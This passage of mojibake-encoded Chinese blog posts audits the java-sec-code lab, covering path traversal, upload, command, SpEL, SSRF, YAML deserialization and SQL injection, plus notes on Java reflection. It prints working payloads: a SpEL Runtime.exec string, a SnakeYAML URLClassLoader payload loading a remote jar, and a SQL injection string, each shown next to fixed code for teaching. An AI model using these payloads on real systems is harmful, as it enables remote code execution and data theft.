,çœ‹åˆ°åå­—è¯»å–å›¾ç‰‡ç„¶åè½¬base64è¾“å‡º,é¦–å…ˆåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨è€Œä¸”ä¸æ˜¯ç›®å½•ï¼Œå°±ä»¥æ–‡ä»¶æµè¯»å‡ºæ¥ private String getImgBase64(String imgFile) throws IOException { logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;)); logger.info(&quot;File path: &quot; + imgFile); File f = new File(imgFile); if (f.exists() &amp;&amp; !f.isDirectory()) { byte[] data = Files.readAllBytes(Paths.get(imgFile)); return new String(Base64.encodeBase64(data)); } else { return &quot;File doesn't exist or is not a file.&quot;; } } å®šä½åˆ°æ¼æ´ä»£ç å’Œä¿®å¤ä»£ç  @GetMapping(&quot;/path_traversal/vul&quot;) public String getImage(String filepath) throws IOException { return getImgBase64(filepath); }@GetMapping(&quot;/path_traversal/sec&quot;) public String getImageSec(String filepath) throws IOException { if (SecurityUtil.pathFilter(filepath) == null) { logger.info(&quot;Illegal file path: &quot; + filepath); return &quot;Bad boy. Illegal file path.&quot;; } return getImgBase64(filepath); } å¯ä»¥çœ‹åˆ°æ¼æ´ä»£ç æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¿®å¤ä»£ç å¤šäº†ä¸ªSecurityUtil.pathFilter(filepath),æˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹ public static String pathFilter(String filepath) { String temp = filepath; // use while to sovle multi urlencode while (temp.indexOf('%') != -1) { try { temp = URLDecoder.decode(temp, &quot;utf-8&quot;); } catch (UnsupportedEncodingException e) { logger.info(&quot;Unsupported encoding exception: &quot; + filepath); return null; } catch (Exception e) { logger.info(e.toString()); return null; } } if (temp.contains(&quot;..&quot;) || temp.charAt(0) == '/') { return null; } return filepath; } ä¿®å¤ä¹Ÿå¾ˆç®€å•ï¼Œé¦–å…ˆåˆ¤æ–­%ï¼Œæœ‰åˆ™è¿›è¡Œurlè§£ç å¤„ç†ï¼Œç„¶ååˆ¤æ–­æœ‰æ— ..å’Œ/,å¸¸è§„çš„è¿‡æ»¤ æ–‡ä»¶ä¸Šä¼ å®¡è®¡æ–‡ä»¶ä¸Šä¼ åœ¨springä¸šåŠ¡ä¸­ä¼šå¾ˆå°‘ï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨cdnè¿˜æœ‰å¾—ä¸Šä¼ åˆ°ç‰¹å®šçš„ç›®å½•ä¸‹æ‰èƒ½è§£ææ‰§è¡Œ springçš„jspæ–‡ä»¶å¿…é¡»åœ¨web-infç›®å½•ä¸‹æ‰èƒ½æ‰§è¡Œ ä¸Šä¼ waråŒ…åˆ°tomcatçš„webappsç›®å½•ã€‚ æ²¡æœ‰è¿‡æ»¤çš„ä¸Šä¼  @PostMapping(&quot;/upload&quot;) public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file, RedirectAttributes redirectAttributes) { if (file.isEmpty()) { // èµ‹å€¼ç»™uploadStatus.htmlé‡Œçš„åŠ¨æ€å‚æ•°message redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;); return &quot;redirect:/file/status&quot;; } try { // Get the file and save it somewhere byte[] bytes = file.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename()); Files.write(path, bytes); redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;You successfully uploaded '&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;'&quot;); } catch (IOException e) { redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;); logger.error(e.toString()); } return &quot;redirect:/file/status&quot;; } è¿™é‡Œå›ºå®šåœ¨tmpç›®å½•ä¸‹ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡../æ–‡ä»¶åè¿™æ ·ä¸Šä¼ åˆ°ä»»æ„æœ‰æƒé™çš„ç›®å½• é™åˆ¶å›¾ç‰‡çš„ä¸Šä¼  @PostMapping(&quot;/upload/picture&quot;) @ResponseBody public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception { if (multifile.isEmpty()) { return &quot;Please select a file to upload&quot;; } String fileName = multifile.getOriginalFilename(); String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // è·å–æ–‡ä»¶åç¼€å String mimeType = multifile.getContentType(); // è·å–MIMEç±»å‹ String filePath = UPLOADED_FOLDER + fileName; File excelFile = convert(multifile); // åˆ¤æ–­æ–‡ä»¶åç¼€åæ˜¯å¦åœ¨ç™½åå•å†… æ ¡éªŒ1 String[] picSuffixList = {&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;}; boolean suffixFlag = false; for (String white_suffix : picSuffixList) { if (Suffix.toLowerCase().equals(white_suffix)) { suffixFlag = true; break; } } if (!suffixFlag) { logger.error(&quot;[-] Suffix error: &quot; + Suffix); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } // åˆ¤æ–­MIMEç±»å‹æ˜¯å¦åœ¨é»‘åå•å†… æ ¡éªŒ2 String[] mimeTypeBlackList = { &quot;text/html&quot;, &quot;text/javascript&quot;, &quot;application/javascript&quot;, &quot;application/ecmascript&quot;, &quot;text/xml&quot;, &quot;application/xml&quot; }; for (String blackMimeType : mimeTypeBlackList) { // ç”¨containsæ˜¯ä¸ºäº†é˜²æ­¢text/html;charset=UTF-8ç»•è¿‡ if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) { logger.error(&quot;[-] Mime type error: &quot; + mimeType); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } } // åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦æ˜¯å›¾ç‰‡ æ ¡éªŒ3 boolean isImageFlag = isImage(excelFile); deleteFile(randomFilePath); if (!isImageFlag) { logger.error(&quot;[-] File is not Image&quot;); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } try { // Get the file and save it somewhere byte[] bytes = multifile.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename()); Files.write(path, bytes); } catch (IOException e) { logger.error(e.toString()); deleteFile(filePath); return &quot;Upload failed&quot;; } logger.info(&quot;[+] Safe file. Suffix: {}, MIME: {}&quot;, Suffix, mimeType); logger.info(&quot;[+] Successfully uploaded {}&quot;, filePath); return String.format(&quot;You successfully uploaded '%s'&quot;, filePath); }private void deleteFile(String filePath) { File delFile = new File(filePath); if(delFile.isFile() &amp;&amp; delFile.exists()) { if (delFile.delete()) { logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;); return; } } logger.info(filePath + &quot; delete failed!&quot;); } /** * ä¸ºäº†ä½¿ç”¨ImageIO.read() * * ä¸å»ºè®®ä½¿ç”¨transferToï¼Œå› ä¸ºåŸå§‹çš„MultipartFileä¼šè¢«è¦†ç›– * https://stackoverflow.com/questions/24339990/how-to-convert-a-multipart-file-to-file */ private File convert(MultipartFile multiFile) throws Exception { String fileName = multiFile.getOriginalFilename(); String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); UUID uuid = Generators.timeBasedGenerator().generate(); randomFilePath = UPLOADED_FOLDER + uuid + suffix; // éšæœºç”Ÿæˆä¸€ä¸ªåŒåç¼€åçš„æ–‡ä»¶ File convFile = new File(randomFilePath); boolean ret = convFile.createNewFile(); if (!ret) { return null; } FileOutputStream fos = new FileOutputStream(convFile); fos.write(multiFile.getBytes()); fos.close(); return convFile; } /** * Check if the file is a picture. */ private static boolean isImage(File file) throws IOException { BufferedImage bi = ImageIO.read(file); return bi != null; } åˆ©ç”¨uuidéšæœºç”Ÿæˆä¸€ä¸ªåŒåç¼€åæ–‡ä»¶ï¼Œåœ¨/tmp/uuid+jpg 1.é€šè¿‡suffixFlagæ¥åˆ¤æ–­æ–‡ä»¶çš„åç¼€åæ˜¯å¦å¤„äºç™½åå•ä¸­2.åˆ¤æ–­MiMEç±»å‹æ˜¯å¦åœ¨é»‘åå•3.é€šè¿‡isImageåˆ¤æ–­æ˜¯å¦ä¸ºå›¾ç‰‡ æ— æ³•é€šè¿‡åˆ¤æ–­åˆ™ç›´æ¥åˆ é™¤æ–‡ä»¶ å‘½ä»¤æ³¨å…¥å®¡è®¡ åˆ©ç”¨ä¸€äº›&amp;&amp; ;çš„åˆ†éš”ç¬¦å°±èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ è¿™é‡Œç›´æ¥çœ‹ä¿®å¤ä»£ç  ä»cmdFilterä¸€ç›´è·Ÿåˆ° private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\\\.-]+$&quot;); åªèƒ½åŒ…å«a-zA-Z0-9_.-è¿™äº›å­—ç¬¦ SpELæ³¨å…¥å®¡è®¡SpELæœ‰ä¸‰ç§ç”¨æ³•ï¼Œä¸€ç§æ˜¯åœ¨æ³¨è§£@Valueä¸­ï¼›ä¸€ç§æ˜¯XMLé…ç½®ï¼›æœ€åä¸€ç§æ˜¯åœ¨ä»£ç å—ä¸­ä½¿ç”¨Expressionã€‚ è¿™é‡Œçš„æ¼æ´ä»£ç å°±æ˜¯é‡‡ç”¨Expressionï¼Œæ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œå¯ä»¥é€šè¿‡ T() è°ƒç”¨ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ª Class Objectï¼Œç„¶åå†è°ƒç”¨ç›¸åº”çš„æ–¹æ³•æˆ–å±æ€§ @GetMapping(&quot;/spel/vuln&quot;) public String rce(String expression) { ExpressionParser parser = new SpelExpressionParser(); // fix method: SimpleEvaluationContext return parser.parseExpression(expression).getValue().toString(); } public static void main(String[] args) { ExpressionParser parser = new SpelExpressionParser(); String expression = &quot;T(java.lang.Runtime).getRuntime().exec(\\&quot;open -a Calculator\\&quot;)&quot;; String result = parser.parseExpression(expression).getValue().toString(); System.out.println(result); } äºæ˜¯æˆ‘ä»¬æ„é€ payload T(java.lang.Runtime).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;) SSRFå®¡è®¡å®šä½åˆ°URLConnectionæ–¹æ³• public static String URLConnection(String url) { try { URL u = new URL(url); URLConnection urlConnection = u.openConnection(); BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request // BufferedReader in = new BufferedReader(new InputStreamReader(u.openConnection().getInputStream())); String inputLine; StringBuilder html = new StringBuilder(); while ((inputLine = in.readLine()) != null) { html.append(inputLine); } in.close(); return html.toString(); } catch (Exception e) { logger.error(e.getMessage()); return e.getMessage(); } } è¿™é‡Œç›´æ¥è°ƒç”¨URLçš„æ„é€ æ–¹æ³•æ¥æ”¶æˆ‘ä»¬çš„ä¼ å…¥çš„url for (i = start ; !aRef &amp;&amp; (i &lt; limit) &amp;&amp; ((c = spec.charAt(i)) != '/') ; i++) { if (c == ':') { String s = toLowerCase(spec.substring(start, i)); if (isValidProtocol(s)) { newProtocol = s; start = i + 1; } break; } é€šè¿‡:å¯¹åè®®è¿›è¡Œæˆªæ–­ï¼Œç„¶åæ‰”è¿›isValidProtocol private boolean isValidProtocol(String protocol) { int len = protocol.length(); if (len &lt; 1) return false; char c = protocol.charAt(0); if (!Character.isLetter(c)) return false; for (int i = 1; i &lt; len; i++) { c = protocol.charAt(i); if (!Character.isLetterOrDigit(c) &amp;&amp; c != '.' &amp;&amp; c != '+' &amp;&amp; c != '-') { return false; } } return true; } ç®€å•çš„å¯¹å­—ç¬¦è¿›è¡Œäº†åˆ¤æ–­ è€Œåé€šè¿‡getURLStreamHandler(protocol)è·å¾—ä¸€ä¸ªhandler ç„¶åå‰é¢URLConnection urlConnection = u.openConnection(); openConnection()æ–¹æ³•å°±ä¼šæ ¹æ®å‰é¢è·å–çš„handlerè¿›è¡Œç½‘ç»œè¯·æ±‚ æ²¡æœ‰ä»»ä½•è¿‡æ»¤å°±ä¼šå¯¼è‡´ssrf ä¿®å¤ä»£ç  é™åˆ¶å‰ç¼€ public static boolean isHttp(String url) { return url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;);} å¼€å¯å¯¹ç”¨æˆ·è¡Œä¸ºç›‘å¬çš„hook try { SecurityUtil.startSSRFHook(); return HttpUtils.URLConnection(url); } catch (SSRFException | IOException e) { return e.getMessage(); } finally { SecurityUtil.stopSSRFHook(); } RCEå®¡è®¡è¿™é‡Œçœ‹ä¸€ä¸‹é‚£ä¸ªYamlååºåˆ—åŒ–RCE æ¼æ´åŸç† yamlååºåˆ—åŒ–æ—¶å¯ä»¥é€šè¿‡!!+å…¨ç±»åæŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šå®ä¾‹åŒ–è¯¥ç±»ï¼Œå¯ä»¥é€šè¿‡æ„é€ ScriptEngineManagerpayloadå¹¶åˆ©ç”¨SPIæœºåˆ¶é€šè¿‡URLClassLoaderæˆ–è€…å…¶ä»–payloadå¦‚JNDIæ–¹å¼è¿œç¨‹åŠ è½½å®ä¾‹åŒ–æ¶æ„ç±»ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ åˆ©ç”¨payload æ›´æ”¹ä¸€ä¸‹åˆ©ç”¨å‘½ä»¤ï¼Œç¼–è¯‘å¥½ååœ¨å½“å‰ç›®å½•èµ·ä¸€ä¸ªhttpæœåŠ¡ public class SnakeYaml_Demo { public static void main(String[] args) { // serialize(); String s = &quot;!!javax.script.ScriptEngineManager [\\n&quot; + &quot; !!java.net.URLClassLoader [[\\n&quot; + &quot; !!java.net.URL [\\&quot;http://127.0.0.1:1234/yaml-payload.jar\\&quot;]\\n&quot; + &quot; ]]\\n&quot; + &quot;]&quot;; deserialize(s); } public static void serialize() { User user = new User(); user.setUsername(&quot;qqw&quot;); Yaml yaml = new Yaml(); String dump = yaml.dump(user); System.out.println(dump); } public static void deserialize(String s) { // String s = &quot;!!org.example.User {username: qqw}&quot;; Yaml yaml = new Yaml(); User user = yaml.load(s); }} é¶åœº http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[%20!!java.net.URLClassLoader%20[[%20!!java.net.URL%20[%22http://127.0.0.1:1234/yaml-payload.jar%22]%20]]%20] Todoâ€¦","link":"/2023/03/07/java_sec_other/"},{"title":"Java_Sec_Code---Sqlæ³¨å…¥ä»£ç å®¡è®¡","text":"å‰è¨€å¼€å§‹JavaåŸºç¡€æ¼æ´çš„ä»£ç å®¡è®¡(è¿™ä¸ªç³»åˆ—æ…¢æ…¢æ›´) é¡¹ç›®åœ°å€https://github.com/JoyChou93/java-sec-code 0x1åŸºäºJDBCçš„sqlæ³¨å…¥å®¡è®¡Statement Sqlæ³¨å…¥æˆ‘ä»¬ç›´æ¥å®šä½åˆ°è¿™é‡Œçš„æ¼æ´ä»£ç  æˆ‘ä»¬ä¼šå‘ç°è¿™é‡Œæ˜¯ç”¨Statementè¿›è¡Œæ‰§è¡Œsqlè¯­å¥ï¼Œå®ƒä¼šç›´æ¥æŠŠå‚æ•°æ‹¼æ¥è¿›å…¥sqlè¯­å¥ï¼Œä¸ç»è¿‡ä»»ä½•å¤„ç†ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´sqlæ³¨å…¥ï¼Œmomoæ’ä»¶ä¹Ÿç›´æ¥å°±ç»™æˆ‘ä»¬çˆ†çº¢äº†ï¼Œæ˜¾ç¤ºè¿™é‡Œå­˜åœ¨sqlæ³¨å…¥æ¼æ´ æˆ‘ä»¬debugä¸€ä¸‹ï¼Œåœ¨webç«¯ä¼ å…¥adminï¼Œä¹Ÿå‘ç°äº†sqlè¯­å¥æ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†ï¼Œå°±ç›´æ¥æ‰§è¡Œäº† äºæ˜¯æˆ‘ä»¬æ³¨å…¥çš„payloadå°±æ˜¯ç®€å•çš„é—­åˆæ‰å•å¼•å·å°±å¥½äº† ?username=admin'or'1'='1 Statement Sqlæ³¨å…¥fixçŸ¥é“äº†æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œæˆ‘ä»¬å†çœ‹çœ‹ä¿®å¤æ¼æ´çš„ä»£ç  å¯ä»¥å‘ç°ï¼Œè¿™é‡Œçš„è¯­å¥å°†Statementæ”¹æˆäº†PreparedStatementï¼Œå®ƒä¼šå¯¹sqlè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œå¹¶ä¸”å°†å‚æ•°ä¼ å…¥çš„ä½ç½®é‡‡ç”¨é—®å·å ä½ç¬¦ï¼Œé¢„ç¼–è¯‘ä¹‹åå†è®¾ç½® å½“ç„¶ï¼Œè¿™ä¹ˆè¯´æ˜¯ä¸å®¹æ˜“ç†è§£çš„ï¼Œæˆ‘ä»¬è·Ÿè¿›å»è°ƒè¯•çœ‹ä¸€ä¸‹å‚æ•°ç©¶ç«Ÿæ˜¯æ€ä¹ˆè¢«è®¾ç½®è¿›å»æŸ¥è¯¢çš„ï¼Œæˆ‘ä»¬å°†æ–­ç‚¹æ–­åœ¨st.setStringæ–¹æ³•ä¸Šï¼Œè·Ÿè¿›è°ƒè¯• ä¸€ç›´è·Ÿè¿›åˆ°ifåˆ¤æ–­é‡Œé¢ï¼Œæœ‰ä¸ªneedsQuotedå˜é‡ï¼Œå¼€å§‹è¢«è®¾ç½®ä¸ºfalseï¼Œç„¶åå°†ä¼ å…¥çš„å‚æ•°(admin'or'1'='1)é•¿åº¦å–å‡ºæ¥ï¼Œè®¾ç½®ä¸€ä¸ªbufå˜é‡ è¿›å…¥forå¾ªç¯ä¹‹åï¼Œå¼€å§‹å¯¹ä¼ å…¥çš„å­—ç¬¦è¿›è¡Œé€å­—åˆ¤æ–­ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°é‡Œæœ‰'ï¼Œè¢«switchæ•æ‰åˆ°äº† ç„¶åå°±åœ¨åé¢æ·»åŠ \\å’Œ\\'ï¼Œå†breakå‡ºå»ã€‚æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªswitchå°±æ˜¯å¯¹æˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯å®ƒä¸æ˜¯åœ¨åŸå…ˆçš„åŸºç¡€ä¸Šæ›¿æ¢ï¼Œè€Œæ˜¯æ–°å»ºä¸€ä¸ªå˜é‡å»é€ä¸ªæ·»åŠ ï¼Œå¹¶ä¸”ä¼šåœ¨é¦–ä½æ·»åŠ ä¸€ä¸ª'ï¼Œè¿™æ ·æœ€åè¿›è¡ŒæŸ¥è¯¢çš„å‚æ•°å°±å®Œå…¨ä¸æ˜¯æˆ‘ä»¬ä¼ å…¥çš„é‚£ä¸ªäº†ï¼Œè€Œæ˜¯ä¸€ä¸ªæ–°å€¼bufã€‚'admin\\' or \\'1\\'=\\'1' è¿™æ ·å°±èƒ½é˜²æ­¢sqlæ³¨å…¥ï¼Œä½†æ˜¯åªæœ‰æˆ‘ä»¬ä½¿ç”¨?ä½œä¸ºå ä½ç¬¦æ‰èµ·ä½œç”¨ï¼Œå¦‚æœæ˜¯ç›´æ¥æ‹¼æ¥ï¼Œä»ç„¶ä¼šäº§ç”Ÿsqlæ³¨å…¥ï¼Œå¦‚ä¸‹ JDBCäº§ç”Ÿæ³¨å…¥æƒ…å†µç›´æ¥æ‹¼æ¥PreparedStatementåœ¨ä½¿ç”¨?ä½œä¸ºå ä½ç¬¦æ‰èƒ½é˜²æ­¢sqlæ³¨å…¥ï¼Œç›´æ¥æ‹¼æ¥ä»ä¼šäº§ç”Ÿsqlæ³¨å…¥ æ¯”å¦‚ String sql = &quot;select * from users where username = '&quot; + username + &quot;'&quot;;PreparedStatement st = con.prepareStatement(sql);logger.info(st.toString());ResultSet rs = st.executeQuery(); ä½¿ç”¨inè¯­å¥ä¸€èˆ¬å‡ºç°åœ¨åˆ é™¤è¯­å¥ä¸­ï¼Œæœ‰æ—¶å€™æ— æ³•ç¡®å®šåˆ é™¤å¯¹è±¡çš„æ•°é‡ï¼Œç›´æ¥æ‹¼æ¥ï¼Œå¦‚ï¼š String sql = &quot;delete from users where id in(&quot;+id+&quot;);&quot; åº”è¯¥å°†å¯¹è±¡éå†ä¼ å…¥ï¼Œä½¿ç”¨?å ä½ç¬¦ï¼Œé¢„ç¼–è¯‘ ä½¿ç”¨likeè¯­å¥,order byç­‰å…³é”®å­—æ¨¡ç³ŠæŸ¥è¯¢åœºæ™¯ String sql = &quot;select * from user where username like '%&quot; + name + &quot;%'&quot; //å­˜åœ¨æ³¨å…¥ 0x2åŸºäºMybatisçš„sqlæ³¨å…¥å®¡è®¡Mybatisé‡‡ç”¨parameterTypeå‘sqlè¯­å¥ä¼ å‚ï¼Œæœ‰#{Parameter}å’Œ${Parameter}ä¸¤ç§æ–¹å¼ å…¶ä¸­${Parameter}ä¼ å‚ï¼Œæ˜¯ç›´æ¥å°†å‚æ•°æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œå¯¹è¾“å…¥æ²¡æœ‰è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´sqlæ³¨å…¥ è€Œ #{Parameter}ä¼ å‚ï¼Œæ˜¯é‡‡ç”¨äº†é¢„ç¼–è¯‘çš„æ„é€ sqlè¯­å¥ï¼Œé˜²æ­¢sqlæ³¨å…¥ mybatisäº§ç”Ÿæ³¨å…¥æƒ…å†µlikeæ³¨å…¥åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨ #{} ç¨‹åºä¼šæŠ¥é”™ï¼Œå®¹æ˜“æŠŠ #å· æ”¹æˆäº† $ï¼Œè¿™å°±ç…§æ ·å¯¼è‡´äº†æ‹¼æ¥çš„é—®é¢˜äº†ã€‚ &lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where username like '%${_parameter}%' &lt;/select&gt; &lt;!-- fix code--&gt; &lt;select id=&quot;findByUserNamesec&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where username like concat('%',#{_parameter}, '%') &lt;/select&gt; inè¯­å¥äº§ç”Ÿæ³¨å…¥&lt;select id=&quot;findByUserNameVuln04&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where id in (${id}) &lt;/select&gt; &lt;!-- fix code--&gt;&lt;select id=&quot;findByIdSec04&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; SELECT * from users WHERE id IN &lt;foreach collection=&quot;id&quot; item=&quot;id&quot; open=&quot;(&quot; close=&quot;)&quot; separator=&quot;,&quot;&gt; #{id} &lt;/foreach&gt; &lt;/select&gt; order byè¯­å¥å’ŒJDBCåŒç†ï¼Œä½¿ç”¨#{}æ–¹å¼ä¼ å‚ä¼šå¯¼è‡´order byè¯­å¥å¤±æ•ˆï¼Œæ‰€ä»¥ä½¿ç”¨order byè¯­å¥çš„æ—¶å€™è¿˜æ˜¯éœ€è¦åšå¥½è¿‡æ»¤ å‚è€ƒhttps://xz.aliyun.com/t/10686#toc-5 https://tttang.com/archive/1726/ https://drun1baby.github.io/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#toc-heading-16","link":"/2023/02/03/java_sec_sqli/"},{"title":"JAVAåå°„å’Œä»£ç†","text":"ä¸ªäººå­¦ä¹ ç¬”è®°ï¼Œæœ‰äº›åœ°æ–¹å¯èƒ½æ²¡åšè®°å½•ï¼Œæˆ–è€…è®°å½•åœ¨åˆ«å¤„ï¼Œä»…ä¾›å‚è€ƒ Javaåå°„å‡ ä¸ªå¸¸ç”¨çš„æ–¹æ³• è·å–ç±»çš„â½…æ–¹æ³•: forName å®ä¾‹ï¦µåŒ–ç±»å¯¹è±¡çš„â½…æ–¹æ³•: newInstance è·å–å‡½æ•°çš„â½…æ–¹æ³•: getMethocd æ‰§â¾è¡Œï¨ˆå‡½æ•°çš„â½…æ–¹æ³•: invoke åå°„èµ‹å€¼åˆ©ç”¨åå°„ç»™nameå’Œageå­—æ®µèµ‹å€¼: import java.lang.reflect.Field;public class anl { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { String name = &quot;Xiao Ming&quot;; int age = 20; Person1 p = new Person1(); Class&lt;? extends Person1&gt; c = p.getClass(); Field f1 = c.getDeclaredField(&quot;name&quot;); Field f2 = c.getDeclaredField(&quot;age&quot;); f1.setAccessible(true); f1.set(p, name); f2.setAccessible(true); f2.set(p, age); System.out.println(p.getName()); // &quot;Xiao Ming&quot; System.out.println(p.getAge()); // 20 }}class Person1 { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} åˆå§‹åŒ–åœ¨pç‰›Javaå®‰å…¨æ¼«è°ˆé‡Œè®²åˆ°äº†ä¸€ä¸ªåˆå§‹åŒ– è¿˜æœ‰è¿™ä½å¸ˆå‚…çš„æ–‡ç«  public class TrainPrint { { System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); } static { System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class);} public TrainPrint() { System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); } } ç”¨Class.forNameæ¥è¾“å‡ºä¸€ä¸‹ public class TrainPrint { public static void main(String[] args) throws ClassNotFoundException { Class.forName(&quot;TrainPrint&quot;); //ç±»çš„åˆå§‹åŒ– } { System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); } static { System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class); } public TrainPrint() { System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); }} ç”¨newå…³é”®å­—æ¥å®ä¾‹åŒ–è¾“å‡º public class TrainPrint { public static void main(String[] args) throws ClassNotFoundException { // Class.forName(&quot;TrainPrint&quot;); //ç±»çš„åˆå§‹åŒ– TrainPrint trainPrint = new TrainPrint(); //ç±»çš„å®ä¾‹åŒ– } { System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); } static { System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class); } public TrainPrint() { System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); }} è¿™æ ·æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸‰ç§â€åˆå§‹åŒ–â€æ–¹æ³•çš„è°ƒç”¨é¡ºåº ç±»çš„å®ä¾‹åŒ–ï¼šstatic {}-&gt;{}-&gt;æ„é€ å‡½æ•°ç±»çš„åˆå§‹åŒ–ï¼šstatic {} å¹¶ä¸”ï¼ŒClass.forNameä¸­çš„initialize=trueå®é™…ä¸Šæ˜¯å‘Šè¯‰javaè™šæ‹Ÿæœºæ‰§è¡Œç±»çš„åˆå§‹åŒ–ï¼Œè€Œä¸æ˜¯å®ä¾‹åŒ–ï¼Œè¿™ä¸ªåŒºåˆ«è¦æ³¨æ„ã€‚ åå°„æ‰§è¡Œå‘½ä»¤$ çš„ä½œç”¨æ˜¯æŸ¥æ‰¾å†…éƒ¨ç±» Javaçš„æ™®é€šç±» C1 ä¸­æ”¯æŒç¼–å†™å†…éƒ¨ç±» C2 ï¼Œè€Œåœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶: C1.class å’Œ C1$C2.class ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä»–ä»¬çœ‹ä½œä¸¤ä¸ªæ— å…³çš„ç±»ï¼Œé€šè¿‡ Class.forName(â€œC1$C2â€) å³å¯åŠ è½½è¿™ä¸ªå†…éƒ¨ç±»ã€‚ è·å¾—ç±»ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨åå°„æ¥è·å–è¿™ä¸ªç±»ä¸­çš„å±æ€§ã€æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œå¹¶è°ƒç”¨æ–¹æ³•ã€‚ å…¶ä¸­class.newInstance() å°±æ˜¯å¯ä»¥è°ƒç”¨ç±»ä¸­çš„æ— å‚æ„é€ æ–¹æ³•ï¼Œè€Œé‡åˆ°ä¸‹é¢ä¸¤ç§æƒ…å†µï¼Œä¼šå‘ç°åˆ©ç”¨æ€»æ˜¯ä¸æˆåŠŸ 1.ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³• 2.ä½¿ç”¨çš„ç±»æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ æœ€å¸¸è§çš„å°±æ˜¯Runtimeç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);cls.getMethod(&quot;exec&quot;, String.class).invoke(cls.newInstance(), &quot;id&quot;); æ‰€ä»¥æˆ‘ä»¬è¿™æ ·æ‰§è¡Œå‘½ä»¤æ˜¯ä¸æˆåŠŸçš„ï¼Œä¼šæŠ¥é”™ è¿™æ¶‰åŠåˆ°è®¾è®¡æ¨¡å¼ä¸­çš„å•ä¾‹æ¨¡å¼ï¼Œåªæœ‰åœ¨ç±»åˆå§‹åŒ–çš„æ—¶å€™æ‰§è¡Œä¸€æ¬¡æ„é€ æ–¹æ³•ï¼Œç„¶ååªèƒ½é€šè¿‡getRuntimeæ¥è·å–è¿™ä¸ªå¯¹è±¡ 